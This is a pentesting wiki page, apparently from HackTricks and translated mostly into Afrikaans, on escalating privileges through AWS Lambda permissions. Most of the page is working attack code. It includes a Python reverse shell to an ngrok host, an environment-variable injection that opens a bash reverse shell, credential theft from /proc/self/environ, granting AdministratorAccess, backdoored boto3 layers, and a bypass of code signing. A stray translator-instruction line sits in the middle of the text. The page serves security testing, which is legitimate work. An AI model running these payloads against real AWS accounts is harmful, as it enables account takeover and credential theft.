# AWS - Lambda Privesc

{{#include ../../../banners/hacktricks-training.md}}

## lambda

Meer inligting oor lambda in:

{{#ref}}
../aws-services/aws-lambda-enum.md
{{#endref}}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Gebruikers met die **`iam:PassRole`, `lambda:CreateFunction`, en `lambda:InvokeFunction`** toestemmings kan hul voorregte eskaleer.\
Hulle kan **'n nuwe Lambda function skep en dit 'n bestaande IAM role toewys**, en sodoende die funksie die toestemmings gee wat met daardie rol geassosieer is. Die gebruiker kan dan **kode skryf en na hierdie Lambda function oplaai (byvoorbeeld met 'n rev shell)**.\
Sodra die funksie ingestel is, kan die gebruiker die uitvoering **aktiveer** en die beoogde aksies deur die Lambda function via die AWS API aan te roep. Hierdie benadering laat die gebruiker toe om take indirek deur die Lambda function uit te voer, werkend met die toegangsvlak wat aan die verwante IAM role toegeken is.\\

’n aanvaller kan dit misbruik om 'n **rev shell te kry en die token te steel**:
```python:rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Jy kan ook **abuse the lambda role permissions** vanaf die lambda-funksie self.\
As die lambda-rol genoeg permissies gehad het, kon jy dit gebruik om admin-regte aan jouself toe te ken:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Dit is ook moontlik om die lambda's role credentials te leak sonder om 'n eksterne verbinding te benodig. Dit sal nuttig wees vir **Network isolated Lambdas** wat op interne take gebruik word. As daar onbekende security groups is wat jou reverse shells filter, sal hierdie kode jou toelaat om die credentials direk as die uitset van die lambda te leak.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potensiële impak:** Direkte privesc na die arbitrêre lambda service role wat gespesifiseer is.

> [!CAUTION]
> Neem kennis dat selfs al mag dit interessant lyk, **`lambda:InvokeAsync`** laat op sigself NIE toe om **`aws lambda invoke-async`** uit te voer nie; jy benodig ook `lambda:InvokeFunction`

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Soos in die vorige scenario, kan jy **jouself die `lambda:InvokeFunction` toestemming gee** as jy die toestemming **`lambda:AddPermission`** het.
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potensiële impak:** Direkte privesc na die arbitrêre lambda-diensrol wat gespesifiseer is.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Gebruikers met **`iam:PassRole`, `lambda:CreateFunction`, en `lambda:CreateEventSourceMapping`** regte (en moontlik `dynamodb:PutItem` en `dynamodb:CreateTable`) kan indirek **escalate privileges** selfs sonder `lambda:InvokeFunction`.\
Hulle kan 'n **Lambda function met kwaadwillige kode skep en dit 'n bestaande IAM-rol toewys**.

In plaas daarvan om die Lambda direk aan te roep, stel die gebruiker 'n bestaande DynamoDB-tabel op of gebruik dit, en koppel dit aan die Lambda deur middel van 'n event source mapping. Hierdie opstelling verseker dat die Lambda function outomaties geaktiveer word wanneer 'n nuwe item in die tabel ingevoeg word, hetsy deur die gebruiker se aksie of deur 'n ander proses, en roep dus die Lambda function indirek aan en voer die kode uit met die regte van die deurgegee IAM-rol.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
As DynamoDB reeds in die AWS-omgewing aktief is, hoef die gebruiker slegs die **gebeurtenisbronkartering** vir die Lambda-funksie op te stel. Indien DynamoDB egter nie in gebruik is nie, moet die gebruiker 'n **nuwe tabel skep** met streaming aangeskakel:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Nou is dit moontlik om die **Lambda-funksie aan die DynamoDB-tabel te koppel** deur **'n event source mapping te skep**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Met die Lambda-funksie wat aan die DynamoDB-stream gekoppel is, kan die attacker **indirek die Lambda laat afgaan deur die DynamoDB-stream te aktiveer**. Dit kan bereik word deur **'n item by die DynamoDB-tabel in te voeg**:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potensiële impak:** Direkte privesc na die gespesifiseerde lambda diensrol.

### `lambda:AddPermission`

’n aanvaller met hierdie toestemming kan **homself (of ander) enige toestemmings toeken** (dit genereer resource-based policies om toegang tot die resource te verleen):
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
**Potensiële impak:** Direkte privesc na die lambda diensrol deur toestemming te gee om die kode te wysig en dit uit te voer.

### `lambda:AddLayerVersionPermission`

An attacker met hierdie toestemming kan **gee vir homself (of ander) die toestemming `lambda:GetLayerVersion`**. Hy kan toegang tot die layer kry en soek na kwesbaarhede of sensitiewe inligting
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Potensiële impak:** Potensiële toegang tot gevoelige inligting.

### `lambda:UpdateFunctionCode`

Gebruikers wat die **`lambda:UpdateFunctionCode`** toestemming het, het die potensiaal om die kode van 'n bestaande Lambda-funksie wat aan 'n IAM role gekoppel is, te wysig.\
Die aanvaller kan **modify the code of the lambda to exfiltrate the IAM credentials**.

Alhoewel die aanvaller moontlik nie die direkte vermoë het om die funksie aan te roep nie, as die Lambda-funksie reeds bestaan en in werking is, is dit waarskynlik dat dit deur bestaande werkstrome of gebeure geaktiveer sal word, en sodoende die uitvoering van die aangepaste kode indirek fasiliteer.
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
**Potensiële impak:** Direkte privesc na die lambda-diensrol wat gebruik word.

### `lambda:UpdateFunctionConfiguration`

#### RCE via env variables

Met hierdie toestemmings is dit moontlik om omgewingsveranderlikes by te voeg wat veroorsaak dat die Lambda arbitrêre kode uitvoer. Byvoorbeeld in python is dit moontlik om die omgewingsveranderlikes `PYTHONWARNING` en `BROWSER` te misbruik om 'n python-proses arbitrêre opdragte uit te voer:
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
Vir ander skripttale is daar ander omgewingsveranderlikes wat jy kan gebruik. Vir meer inligting, sien die subafdelings oor skripttale in:

{{#ref}}
https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html
{{#endref}}

#### RCE via Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) laat toe om **code** in jou lamdba funksie in te sluit, maar dit **afsonderlik te stoor**, sodat die funksie se code klein kan bly en **verskeie funksies code kan deel**.

Binne lambda kan jy die paaie nagaan vanwaar python code gelaai word met 'n funksie soos die volgende:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
These are the places:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

For example, the library boto3 is loaded from `/var/runtime/boto3` (4th position).

#### Eksploitasie

Dit is moontlik om die toestemming `lambda:UpdateFunctionConfiguration` te misbruik om 'n **nuwe layer** by 'n lambda-funksie te voeg. Om ewekansige kode uit te voer, moet hierdie layer 'n **library bevat wat die lambda gaan import.** As jy die kode van die lambda kan lees, kan jy dit maklik uitvind; let ook daarop dat dit moontlik is dat die lambda **al 'n layer gebruik** en jy die layer kan **download** en jou kode daarby kan **voeg**.

Byvoorbeeld, kom ons stel voor dat die lambda die library boto3 gebruik; dit sal 'n plaaslike layer met die nuutste weergawe van die library skep:
```bash
pip3 install -t ./lambda_layer boto3
```
Jy kan `./lambda_layer/boto3/__init__.py` oopmaak en **add the backdoor in the global code** (n funksie om credentials te exfiltrate of byvoorbeeld n reverse shell te kry).

Dan, zip daardie `./lambda_layer` gids en **upload the new lambda layer** in jou eie rekening (of in die slagoffer se rekening, maar jy mag dalk nie permissies daarvoor hê nie).\
Let daarop dat jy n python folder moet skep en die libraries daar moet plaas om /opt/python/boto3 te oorskryf. Ook moet die layer **compatible with the python version** wees wat deur die lambda gebruik word en as jy dit na jou rekening upload, moet dit in die **same region:**
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
Maak nou die opgelaaide lambda layer **deur enige rekening toeganklik**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
En koppel die lambda layer aan die geteikende lambda function:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Die volgende stap sal wees om óf self die **funksie aan te roep** as ons kan, óf te wag totdat **dit aangeroep word** op normale wyse — wat die veiliger metode is.

'n **more stealth way to exploit this vulnerability** kan gevind word in:

{{#ref}}
../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md
{{#endref}}

**Potensiële impak:** Direkte privesc na die gebruikte lambda service role.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Miskien met daardie permissies kan jy 'n funksie skep en dit uitvoer deur die URL aan te roep... maar ek kon nie 'n manier vind om dit te toets nie, laat weet my as jy dit doen!

### Lambda MitM

Sommige lambdas gaan **sensitiewe inligting van gebruikers in parameters ontvang.** As jy RCE in een daarvan kry, kan jy die inligting wat ander gebruikers daaraan stuur exfiltrate — kyk na:

{{#ref}}
../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

## Verwysings

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../banners/hacktricks-training.md}}




### `lambda:DeleteFunctionCodeSigningConfig` or `lambda:PutFunctionCodeSigningConfig` + `lambda:UpdateFunctionCode` — Bypass Lambda Code Signing

If a Lambda function enforces code signing, an attacker who can either remove the Code Signing Config (CSC) or downgrade it to Warn can deploy unsigned code to the function. This bypasses integrity protections without modifying the function's IAM role or triggers.

Permissies (een van):
- Path A: `lambda:DeleteFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`
- Path B: `lambda:CreateCodeSigningConfig`, `lambda:PutFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`

Nota:
- Vir Path B het jy nie 'n AWS Signer profile nodig nie as die CSC policy op `WARN` gestel is (unsigned artifacts allowed).

Stappe (REGION=us-east-1, TARGET_FN=<target-lambda-name>):

Bereid 'n klein payload voor:
```bash
cat > handler.py <<'PY'
import os, json
def lambda_handler(event, context):
return {"pwn": True, "env": list(os.environ)[:6]}
PY
zip backdoor.zip handler.py
```
Pad A) Verwyder CSC en werk dan die code by:
```bash
aws lambda get-function-code-signing-config --function-name $TARGET_FN --region $REGION && HAS_CSC=1 || HAS_CSC=0
if [ "$HAS_CSC" -eq 1 ]; then
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION
fi
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Pad B) Teruggradeer na Warn en werk die kode by (indien delete nie toegelaat is nie):
```bash
CSC_ARN=$(aws lambda create-code-signing-config \
--description ht-warn-csc \
--code-signing-policies UntrustedArtifactOnDeployment=WARN \
--query CodeSigningConfig.CodeSigningConfigArn --output text --region $REGION)
aws lambda put-function-code-signing-config --function-name $TARGET_FN --code-signing-config-arn $CSC_ARN --region $REGION
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Bevestig: Ek sal die relevante Engelse teks in src/pentesting-cloud/aws-security/aws-privilege-escalation/aws-lambda-privesc.md na Afrikaans vertaal en presies dieselfde markdown- en HTML-sintaks behou. Ek sal nie kode, tegnieke name, algemene hacking-woordeskat, cloud/SaaS platformname (bv. aws), die woord 'leak', pentesting, skakels, of paths vertaal nie. Ek sal geen bykomende inhoud byvoeg nie.
```bash
aws lambda invoke --function-name $TARGET_FN /tmp/out.json --region $REGION >/dev/null
cat /tmp/out.json
```
Potensiële impak: Vermoë om ewekansige/onondertekende kode in 'n funksie te laai en uit te voer wat veronderstel was om ondertekende ontplooiings af te dwing, wat moontlik lei tot kode-uitvoering met die bevoegdhede van die funksierol.

Opruiming:
```bash
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION || true
```

